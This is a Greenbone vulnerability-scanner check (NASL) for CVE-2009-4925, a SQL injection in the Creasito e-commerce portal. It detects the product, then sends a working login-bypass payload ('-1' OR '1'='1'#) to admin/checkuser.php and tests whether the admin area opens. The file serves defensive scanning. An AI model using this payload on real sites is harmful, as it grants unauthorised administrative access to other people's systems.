# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801230");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2010-07-19 10:09:06 +0200 (Mon, 19 Jul 2010)");
  script_cve_id("CVE-2009-4925");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Creasito 'username' SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/34809");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34605");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/8497");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/502818/100/0/threaded");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause SQL Injection
  attack and gain sensitive information.");

  script_tag(name:"affected", value:"Portale e-commerce Creasito 1.3.16");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  passed via the 'username' parameter to admin/checkuser.php and checkuser.php,
  which allows attacker to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Creasito is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);

foreach dir (make_list_unique("/creasito", "/Creasito", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";
  res = http_get_cache(item: dir + "/index.php",  port:port);

  if(">Portale e-commerce Creasito <" >< res)
  {
    req=string(
        "POST ", dir, "/admin/checkuser.php HTTP/1.1\r\n",
        "Host: ", host, "\r\n",
        "User-Agent: ", http_get_user_agent(), "\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*\r\n",
        "Accept-Language: en-us,en;q=0.5\r\n",
        "Accept-Encoding: gzip,deflate\r\n",
        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
        "Cookie: PHPSESSID=0b3df1f62407f0caec93393927dab908\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: 64\r\n",
        "\r\n",
        "username=-1%27+OR+%271%27%3D%271%27%23&password=foo&Submit=Entra");
    res = http_keepalive_send_recv(port:port, data:req);

    url = dir + "/admin/amministrazione.php";
    req = http_get(item:url, port:port);
    req = string(chomp(req), '\r\nCookie: ', 'PHPSESSID=0b3df1f62407f0caec93393927dab908\r\n\r\n');
    res = http_keepalive_send_recv(port:port, data:req);

    if('>ADMIN AREA<' >< res && '>Cambio Password <' >< res)
    {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
